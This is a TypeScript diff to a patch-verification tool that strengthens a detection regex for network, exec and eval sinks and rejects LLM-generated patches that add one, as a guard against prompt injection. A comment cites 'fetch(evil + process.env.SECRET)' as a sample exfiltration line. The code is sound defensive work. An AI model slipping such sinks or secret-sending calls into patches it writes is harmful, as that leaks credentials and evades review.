@@ -52,8 +52,20 @@ function passesVerify(before: Finding[], after: Finding[], finding: Finding): bo
  * RSA call and add `fetch(evil + process.env.SECRET)` and still pass. This guard
  * runs ONLY on `source: "llm"` patches (codemods are deterministic + trusted).
  */
-const NEW_SINK_RE =
-  /\b(?:fetch|XMLHttpRequest|WebSocket|navigator\.sendBeacon|child_process|execSync|execFileSync|spawnSync|exec(?:File)?\s*\(|spawn\s*\(|eval\s*\(|new\s+Function|os\.system|subprocess|Runtime\.getRuntime|require\s*\(\s*['"](?:child_process|http|https|net|dns|dgram)['"]|import\s*\(\s*['"](?:child_process|http|https|net|dns|dgram)['"])/g;
+// Node built-in exfil/RCE modules, matched with an OPTIONAL `node:` prefix
+// (idiomatic modern Node — the bare-only form was bypassable) and in BOTH
+// require()/import() call forms AND static `import … from "…"` — the static
+// form has no parens so the old dynamic-only pattern missed it entirely.
+const SINK_MODULES = "child_process|http|https|http2|net|tls|dns|dgram";
+const NEW_SINK_RE = new RegExp(
+  "\\b(?:fetch|XMLHttpRequest|WebSocket|navigator\\.sendBeacon|child_process|execSync|execFileSync|spawnSync|exec(?:File)?\\s*\\(|spawn\\s*\\(|eval\\s*\\(|new\\s+Function|os\\.system|subprocess|Runtime\\.getRuntime" +
+    `|require\\s*\\(\\s*['"](?:node:)?(?:${SINK_MODULES})['"]` +
+    `|import\\s*\\(\\s*['"](?:node:)?(?:${SINK_MODULES})['"]` +
+    `|import\\s+[^;\\n]{0,200}?from\\s*['"](?:node:)?(?:${SINK_MODULES})['"])`,
+  "g",
+);
+/** Stateless (non-global) sibling of {@link NEW_SINK_RE} for per-line `.test()`. */
+const NEW_SINK_LINE_RE = new RegExp(NEW_SINK_RE.source);
 
 /** Max changed lines allowed in an auto-verified LLM patch — a real crypto fix
  * is localized; a sprawling rewrite is not reviewable as "just the fix". */
@@ -81,6 +93,17 @@ function changedLineCount(before: string, after: string): number {
 
 /** Reason an LLM patch is unsafe to auto-verify, or null when it is bounded. */
 function llmPatchRisk(before: string, patch: Patch): string | null {
+  // Reject any exfil/RCE sink on a line the patch ADDS. More robust than a bare
+  // count: it catches a sink SWAPPED into a file that already had one, and does
+  // not depend on the total count rising (trimmed line-set membership).
+  const beforeLines = new Set(before.split("\n").map((l) => l.trim()));
+  const addsSink = patch.newContent
+    .split("\n")
+    .some((l) => !beforeLines.has(l.trim()) && NEW_SINK_LINE_RE.test(l));
+  if (addsSink) {
+    return "LLM patch adds a network/exec/eval sink on a new line (possible prompt-injection); rejected — review the diff manually";
+  }
+  // Backstop: the total sink count must not rise either.
   if (countMatches(NEW_SINK_RE, patch.newContent) > countMatches(NEW_SINK_RE, before)) {
     return "LLM patch introduces a new network/exec/eval sink (possible prompt-injection); rejected — review the diff manually";
   }
